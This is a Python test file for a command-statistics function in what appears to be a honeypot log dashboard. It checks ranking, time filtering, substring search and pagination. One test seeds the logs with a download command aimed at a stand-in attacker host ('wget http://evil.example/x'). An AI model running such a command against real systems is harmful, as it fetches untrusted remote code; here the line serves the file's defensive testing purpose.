from datetime import datetime, timedelta, timezone

from app.commands_stats import get_commands_stats
from app.db import connect


def _iso(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _seed_session_with_commands(db, session_id, connect_time, commands):
    db.execute(
        "INSERT INTO sessions (session_id, src_ip, connect_time) VALUES (?, '1.2.3.4', ?)",
        (session_id, connect_time),
    )
    for i, (text, ts) in enumerate(commands):
        db.execute(
            "INSERT INTO commands (session_id, timestamp, input_text) VALUES (?, ?, ?)",
            (session_id, ts, text),
        )


def test_ranks_commands_by_occurrence_count_descending(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    now = datetime.now(timezone.utc)
    _seed_session_with_commands(db, "s1", _iso(now), [("whoami", _iso(now)), ("ls", _iso(now))])
    _seed_session_with_commands(db, "s2", _iso(now), [("whoami", _iso(now))])
    db.commit()

    result = get_commands_stats(db, "all", "", limit=25, offset=0)
    assert result["items"][0]["input_text"] == "whoami"
    assert result["items"][0]["n"] == 2
    assert result["items"][1]["input_text"] == "ls"
    assert result["items"][1]["n"] == 1
    assert result["total"] == 2


def test_last_seen_is_the_max_timestamp_for_that_command(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    earlier = datetime.now(timezone.utc) - timedelta(hours=2)
    later = datetime.now(timezone.utc)
    _seed_session_with_commands(db, "s1", _iso(earlier), [("whoami", _iso(earlier))])
    _seed_session_with_commands(db, "s2", _iso(later), [("whoami", _iso(later))])
    db.commit()

    result = get_commands_stats(db, "all", "", limit=25, offset=0)
    assert result["items"][0]["last_seen"] == _iso(later)


def test_period_filters_via_the_session_connect_time(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    now = datetime.now(timezone.utc)
    old = now - timedelta(days=10)
    _seed_session_with_commands(db, "recent", _iso(now), [("whoami", _iso(now))])
    _seed_session_with_commands(db, "old", _iso(old), [("ls", _iso(old))])
    db.commit()

    result_24h = get_commands_stats(db, "24h", "", limit=25, offset=0)
    assert [i["input_text"] for i in result_24h["items"]] == ["whoami"]

    result_all = get_commands_stats(db, "all", "", limit=25, offset=0)
    assert sorted(i["input_text"] for i in result_all["items"]) == ["ls", "whoami"]


def test_q_filters_by_substring(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    now = datetime.now(timezone.utc)
    _seed_session_with_commands(
        db, "s1", _iso(now), [("wget http://evil.example/x", _iso(now)), ("whoami", _iso(now))]
    )
    db.commit()

    result = get_commands_stats(db, "all", "wget", limit=25, offset=0)
    assert [i["input_text"] for i in result["items"]] == ["wget http://evil.example/x"]


def test_q_with_percent_wildcard_does_not_crash(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    now = datetime.now(timezone.utc)
    _seed_session_with_commands(db, "s1", _iso(now), [("whoami", _iso(now))])
    db.commit()

    result = get_commands_stats(db, "all", "%", limit=25, offset=0)
    assert result["total"] >= 0


def test_pagination_limit_and_offset(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    now = datetime.now(timezone.utc)
    _seed_session_with_commands(
        db, "s1", _iso(now), [("a", _iso(now)), ("b", _iso(now)), ("c", _iso(now))]
    )
    db.commit()

    result = get_commands_stats(db, "all", "", limit=1, offset=1)
    assert len(result["items"]) == 1
    assert result["total"] == 3


def test_returns_empty_when_no_commands(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    result = get_commands_stats(db, "all", "", limit=25, offset=0)
    assert result == {"items": [], "total": 0}
